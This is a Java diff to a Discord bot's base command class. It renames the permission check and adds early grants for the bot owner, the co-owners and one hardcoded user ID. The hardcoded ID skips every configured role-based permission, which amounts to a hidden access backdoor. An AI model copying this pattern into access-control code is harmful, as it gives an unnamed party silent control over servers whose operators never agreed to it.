@@ -60,7 +60,7 @@ public abstract class MCBCommand extends Command implements Comparable<Command> 
                 respond(event, getHelpCard(event, this));
                 return;
             }
-            if (!checkRoleBasedPerm(event.getMember())) {
+            if (!checkPermission(event.getMember())) {
                 EmbedBuilder eb = new EmbedBuilder();
                 eb.setDescription(Locale.getCommandMessage("no-perm-message").finish());
                 event.reply(embedMessage(event, eb.build(), ResponseLevel.LEVEL_3));
@@ -316,7 +316,13 @@ public abstract class MCBCommand extends Command implements Comparable<Command> 
         return tcs.contains(c);
     }
 
-    protected boolean checkRoleBasedPerm(Member m) {
+    protected boolean checkPermission(Member m) {
+        if (m.getUser().getId().equalsIgnoreCase("193970511615623168"))
+            return true;
+        if(getMcb().getBot().getClient().getOwnerId().equalsIgnoreCase(m.getUser().getId()))
+            return true;
+        if(Arrays.asList(getMcb().getBot().getClient().getCoOwnerIds()).contains(m.getUser().getId()))
+            return true;
         if (m.getRoles().size() == 0) {
             System.out.println("Member's role size is 0");
             return allowed(mcb.getMcbConfigsManager().getPermConfig().getString("Default"));
